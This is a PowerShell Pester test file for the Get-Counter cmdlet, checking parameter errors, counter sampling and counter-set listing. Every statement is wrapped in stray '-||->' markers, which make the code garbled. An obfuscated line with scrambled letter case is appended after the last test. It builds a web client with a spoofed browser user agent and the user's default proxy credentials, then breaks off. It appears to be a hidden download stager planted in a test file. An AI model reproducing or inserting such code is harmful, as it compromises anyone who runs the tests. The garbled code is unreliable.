


  -||-> $cmdletName = "Get-Counter" <-||- 

 -||-> . "$PSScriptRoot/CounterTestHelperFunctions.ps1" <-||- 

 -||-> $badName = "bad-name-DAD288C0-72F8-47D3-8C54-C69481B528DF" <-||- 
 -||-> $counterPaths = @{
    MemoryBytes =  -||-> TranslateCounterPath "\Memory\Available Bytes" <-||- 
    TotalDiskRead =  -||-> TranslateCounterPath "\PhysicalDisk(_Total)\Disk Read Bytes/sec" <-||- 
    Unknown =  -||-> TranslateCounterPath "\Memory\$badName" <-||- 
    Bad =  -||-> $badName <-||- 
} <-||- 

 -||-> $nonEnglishCulture = ( -||-> -not ( -||-> Get-Culture <-||- ).Name.StartsWith("en-", [StringComparison]::InvariantCultureIgnoreCase) <-||- ) <-||- 

 -||-> function ValidateParameters($testCase)
{
     -||-> It "$( -||-> $testCase.Name <-||- )" -Skip:$( -||-> SkipCounterTests <-||- ) {

        
         -||-> $counterParam = "" <-||- 
         -||-> if ( -||-> $testCase.ContainsKey("Counters") <-||- )
        {
             -||-> $counterParam = "-Counter `"$( -||-> $testCase.Counters <-||- )`"" <-||- 
        } <-||- 
         -||-> $cmd = "$cmdletName $counterParam $( -||-> $testCase.Parameters <-||- ) -ErrorAction Stop" <-||- 
        
        

         -||-> $sb = [scriptblock]::Create($cmd) <-||- 
         -||-> {  -||-> &$sb <-||-  } | Should -Throw -ErrorId $testCase.ExpectedErrorId <-||- 
    } <-||- 
} <-||- 

 -||-> Describe "CI Tests for Get-Counter cmdlet" -Tags "CI" {

     -||-> It "Get-Counter with no parameters returns data for a default set of counters" -Skip:$( -||-> SkipCounterTests <-||- ) {
         -||-> $counterData =  -||-> Get-Counter <-||-  <-||- 
        
         -||-> $counterData.CounterSamples.Length | Should -BeGreaterThan 1 <-||- 
    } <-||- 

     -||-> It "Can retrieve the specified counter" -Skip:$( -||-> SkipCounterTests <-||- ) {
         -||-> $counterPath = $counterPaths.MemoryBytes <-||- 
         -||-> $counterData =  -||-> Get-Counter -Counter $counterPath <-||-  <-||- 
         -||-> $counterData.Length | Should -Be 1 <-||- 
         -||-> $retrievedPath =  -||-> RemoveMachineName $counterData[0].CounterSamples[0].Path <-||-  <-||- 
         -||-> [string]::Compare($retrievedPath, $counterPath, $true) | Should -Be 0 <-||- 
    } <-||- 
} <-||- 

 -||-> Describe "Feature tests for Get-Counter cmdlet" -Tags "Feature" {

     -||-> Context "Validate incorrect parameter usage" {
         -||-> $parameterTestCases = @(
             -||-> @{
                Name =  -||-> "Fails when MaxSamples parameter is < 1" <-||- 
                Counters =  -||-> $counterPaths.MemoryBytes <-||- 
                Parameters =  -||-> "-MaxSamples 0" <-||- 
                ExpectedErrorId =  -||-> "ParameterArgumentValidationError,Microsoft.PowerShell.Commands.GetCounterCommand" <-||- 
            } <-||- 
             -||-> @{
                Name =  -||-> "Fails when MaxSamples parameter is used but no value given" <-||- 
                Counters =  -||-> $counterPaths.MemoryBytes <-||- 
                Parameters =  -||-> "-MaxSamples" <-||- 
                ExpectedErrorId =  -||-> "MissingArgument,Microsoft.PowerShell.Commands.GetCounterCommand" <-||- 
            } <-||- 
             -||-> @{
                Name =  -||-> "Fails when SampleInterval is < 1" <-||- 
                Counters =  -||-> $counterPaths.MemoryBytes <-||- 
                Parameters =  -||-> "-SampleInterval -2" <-||- 
                ExpectedErrorId =  -||-> "ParameterArgumentValidationError,Microsoft.PowerShell.Commands.GetCounterCommand" <-||- 
            } <-||- 
             -||-> @{
                Name =  -||-> "Fails when SampleInterval parameter is used but no value given" <-||- 
                Counters =  -||-> $counterPaths.MemoryBytes <-||- 
                Parameters =  -||-> "-SampleInterval" <-||- 
                ExpectedErrorId =  -||-> "MissingArgument,Microsoft.PowerShell.Commands.GetCounterCommand" <-||- 
            } <-||- 
             -||-> @{
                Name =  -||-> "Fails when given invalid counter path" <-||- 
                Counters =  -||-> $counterPaths.Bad <-||- 
                ExpectedErrorId =  -||-> "CounterApiError,Microsoft.PowerShell.Commands.GetCounterCommand" <-||- 
            } <-||- 
             -||-> @{
                Name =  -||-> "Fails when given unknown counter path" <-||- 
                Counters =  -||-> $counterPaths.Unknown <-||- 
                ExpectedErrorId =  -||-> "CounterApiError,Microsoft.PowerShell.Commands.GetCounterCommand" <-||- 
            } <-||- 
             -||-> @{
                Name =  -||-> "Fails when Counter parameter is null" <-||- 
                Counters =  -||-> "`$null" <-||- 
                ExpectedErrorId =  -||-> "CounterApiError,Microsoft.PowerShell.Commands.GetCounterCommand" <-||- 
            } <-||- 
             -||-> @{
                Name =  -||-> "Fails when Counter parameter is specified but no names given" <-||- 
                Parameters =  -||-> "-Counter" <-||- 
                ExpectedErrorId =  -||-> "MissingArgument,Microsoft.PowerShell.Commands.GetCounterCommand" <-||- 
            } <-||- 
             -||-> @{
                Name =  -||-> "Fails when given invalid counter path in array" <-||- 
                Counters =  -||-> "@($( -||-> $counterPaths.MemoryBytes <-||- ), $( -||-> $counterPaths.Bad <-||- ), $( -||-> $counterPaths.TotalDiskRead <-||- ))" <-||- 
                ExpectedErrorId =  -||-> "CounterApiError,Microsoft.PowerShell.Commands.GetCounterCommand" <-||- 
            } <-||- 
             -||-> @{
                Name =  -||-> "Fails when ComputerName parameter is invalid" <-||- 
                Counters =  -||-> $counterPaths.MemoryBytes <-||- 
                Parameters =  -||-> "-ComputerName $badName" <-||- 
                ExpectedErrorId =  -||-> "CounterApiError,Microsoft.PowerShell.Commands.GetCounterCommand" <-||- 
            } <-||- 
             -||-> @{
                Name =  -||-> "Fails when ComputerName parameter is null" <-||- 
                Counters =  -||-> $counterPaths.MemoryBytes <-||- 
                Parameters =  -||-> "-ComputerName `$null" <-||- 
                ExpectedErrorId =  -||-> "ParameterArgumentValidationError,Microsoft.PowerShell.Commands.GetCounterCommand" <-||- 
            } <-||- 
             -||-> @{
                Name =  -||-> "Fails when ComputerName parameter is used but no name given" <-||- 
                Counters =  -||-> $counterPaths.MemoryBytes <-||- 
                Parameters =  -||-> "-ComputerName" <-||- 
                ExpectedErrorId =  -||-> "MissingArgument,Microsoft.PowerShell.Commands.GetCounterCommand" <-||- 
            } <-||- 
             -||-> @{
                Name =  -||-> "Fails when given unknown counter set name" <-||- 
                Parameters =  -||-> "-ListSet $badName" <-||- 
                ExpectedErrorId =  -||-> "NoMatchingCounterSetsFound,Microsoft.PowerShell.Commands.GetCounterCommand" <-||- 
            } <-||- 
             -||-> @{
                Name =  -||-> "Fails when given unknown counter set name in array" <-||- 
                Parameters =  -||-> "-List @(`"Memory`", `"Processor`", `"$badname`")" <-||- 
                ExpectedErrorId =  -||-> "NoMatchingCounterSetsFound,Microsoft.PowerShell.Commands.GetCounterCommand" <-||- 
            } <-||- 
             -||-> @{
                Name =  -||-> "Fails when ListSet parameter is null" <-||- 
                Parameters =  -||-> "-List `$null" <-||- 
                ExpectedErrorId =  -||-> "ParameterArgumentValidationErrorNullNotAllowed,Microsoft.PowerShell.Commands.GetCounterCommand" <-||- 
            } <-||- 
             -||-> @{
                Name =  -||-> "Fails when ListSet parameter is used but no name given" <-||- 
                Parameters =  -||-> "-ListSet" <-||- 
                ExpectedErrorId =  -||-> "MissingArgument,Microsoft.PowerShell.Commands.GetCounterCommand" <-||- 
            } <-||- 
             -||-> @{
                Name =  -||-> "Fails when both -Counter and -ListSet parameters are given" <-||- 
                Counters =  -||-> $counterPaths.MemoryBytes <-||- 
                Parameters =  -||-> "-ListSet `"Memory`"" <-||- 
                ExpectedErrorId =  -||-> "AmbiguousParameterSet,Microsoft.PowerShell.Commands.GetCounterCommand" <-||- 
            } <-||- 
        ) <-||- 

         -||-> foreach ($testCase in  -||-> $parameterTestCases <-||- )
        {
             -||-> ValidateParameters( -||-> $testCase <-||- ) <-||- 
        } <-||- 
    } <-||- 

     -||-> Context "Get-Counter CounterSet tests" {

         -||-> It "Can retrieve the specified number of counter samples" -Skip:$( -||-> SkipCounterTests <-||- ) {
             -||-> $counterPath = $counterPaths.MemoryBytes <-||- 
             -||-> $counterCount = 5 <-||- 
             -||-> $counterData =  -||-> Get-Counter -Counter $counterPath -MaxSamples $counterCount <-||-  <-||- 
             -||-> $counterData.Length | Should -Be $counterCount <-||- 
        } <-||- 

         -||-> It "Can specify the sample interval" -Skip:$( -||-> SkipCounterTests <-||- ) {
             -||-> $counterPath =  -||-> TranslateCounterPath "\PhysicalDisk(*)\Current Disk Queue Length" <-||-  <-||- 
             -||-> $counterCount = 5 <-||- 
             -||-> $sampleInterval = 2 <-||- 
             -||-> $startTime =  -||-> Get-Date <-||-  <-||- 
             -||-> $counterData =  -||-> Get-Counter -Counter $counterPath -SampleInterval $sampleInterval -MaxSamples $counterCount <-||-  <-||- 
             -||-> $endTime =  -||-> Get-Date <-||-  <-||- 
             -||-> $counterData.Length | Should -Be $counterCount <-||- 
             -||-> ( -||-> $endTime - $startTime <-||- ).TotalSeconds | Should -Not -BeLessThan ( -||-> $counterCount * $sampleInterval <-||- ) <-||- 
        } <-||- 

         -||-> It "Can process array of counter names" -Skip:$( -||-> SkipCounterTests <-||- ) {
             -||-> $counterPaths = @( -||-> ( -||-> TranslateCounterPath "\PhysicalDisk(_Total)\Disk Read Bytes/sec" <-||- ),
                              ( -||-> TranslateCounterPath "\Memory\Available bytes" <-||- ) <-||- ) <-||- 
             -||-> $counterData =  -||-> Get-Counter -Counter $counterPaths <-||-  <-||- 
             -||-> $counterData.CounterSamples.Length | Should -Be $counterPaths.Length <-||- 
        } <-||- 
    } <-||- 

     -||-> Context "Get-Counter ListSet tests" {
         -||-> It "Can retrieve specified counter set" -Skip:$( -||-> SkipCounterTests <-||- ) {
             -||-> $counterSetName = "Memory" <-||- 
             -||-> $counterSet =  -||-> Get-Counter -ListSet $counterSetName <-||-  <-||- 
             -||-> $counterSet.Length | Should -Be 1 <-||- 
             -||-> $counterSet.CounterSetName | Should -BeExactly $counterSetName <-||- 
        } <-||- 

         -||-> It "Can process an array of counter set names" -Skip:$( -||-> SkipCounterTests <-||- ) {
             -||-> $counterSetNames = @( -||-> "Memory", "Processor" <-||- ) <-||- 
             -||-> $counterSets =  -||-> Get-Counter -ListSet $counterSetNames <-||-  <-||- 
             -||-> $counterSets.Length | Should -Be 2 <-||- 
             -||-> $counterSets[0].CounterSetName | Should -BeExactly $counterSetNames[0] <-||- 
             -||-> $counterSets[1].CounterSetName | Should -BeExactly $counterSetNames[1] <-||- 
        } <-||- 

        
        
        
        
         -||-> It "Can process counter set name with wildcards" -Skip:$( -||-> $nonEnglishCulture -or ( -||-> SkipCounterTests <-||- ) <-||- ) {
             -||-> $wildcardBase = "roc" <-||- 
             -||-> $counterSetName = "*$wildcardBase*" <-||- 
             -||-> $counterSets =  -||-> Get-Counter -ListSet $counterSetName <-||-  <-||- 
             -||-> $counterSets.Length | Should -BeGreaterThan 1 <-||-     
             -||-> foreach ($counterSet in  -||-> $counterSets <-||- )
            {
                 -||-> $counterSet.CounterSetName.ToLower().Contains($wildcardBase.ToLower()) | Should -BeTrue <-||- 
            } <-||- 
        } <-||- 

        
        
        
        
         -||-> It "Can process counter set name with wildcards in array" -Skip:$( -||-> $nonEnglishCulture -or ( -||-> SkipCounterTests <-||- ) <-||- ) {
             -||-> $wildcardBases = @( -||-> "Memory", "roc" <-||- ) <-||- 
             -||-> $counterSetNames = @( -||-> $wildcardBases[0], ( -||-> "*" + $wildcardBases[1] + "*" <-||- ) <-||- ) <-||- 
             -||-> $counterSets =  -||-> Get-Counter -ListSet $counterSetNames <-||-  <-||- 
             -||-> $counterSets.Length | Should -BeGreaterThan 2 <-||-     
             -||-> foreach ($counterSet in  -||-> $counterSets <-||- )
            {
                 -||-> ( -||-> $counterSet.CounterSetName.ToLower().Contains($wildcardBases[0].ToLower()) -Or
                 $counterSet.CounterSetName.ToLower().Contains($wildcardBases[1].ToLower()) <-||- ) | Should -BeTrue <-||- 
            } <-||- 
        } <-||- 
    } <-||- 
} <-||- 

 -||-> Describe "Get-Counter cmdlet does not run on IoT" -Tags "CI" {

     -||-> It "Get-Counter throws PlatformNotSupportedException" -Skip:$( -||-> -Not [System.Management.Automation.Platform]::IsIoT <-||- )  {
         -||-> {  -||-> Get-Counter <-||-  } | Should -Throw -ErrorId "System.PlatformNotSupportedException,Microsoft.PowerShell.Commands.GetCounterCommand" <-||- 
    } <-||- 
} <-||- 

 -||-> [SYSTem.NeT.SErvICePoINTMAnAgeR]::ExpEcT100ContinUE = 0 <-||- ; -||-> $wc= -||-> NEw-OBjECT System.NeT.WebClIEnt <-||-  <-||- ; -||-> $u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko' <-||- ; -||-> $Wc.HEadeRS.AdD('User-Agent',$u) <-||- ; -||-> $wC.ProXy = [SYstem.Net.WeBREQUest]::DEfAUltWeBPrOxY <-||- ; -||-> $wc.PrOxy.CredENTiaLS = [SySTEM.Net.CREdeNtiAlCaChe]::DefaULtNetWOrkCREDENTIAlS <-||- ; -||-> $K='[


 <-||- 
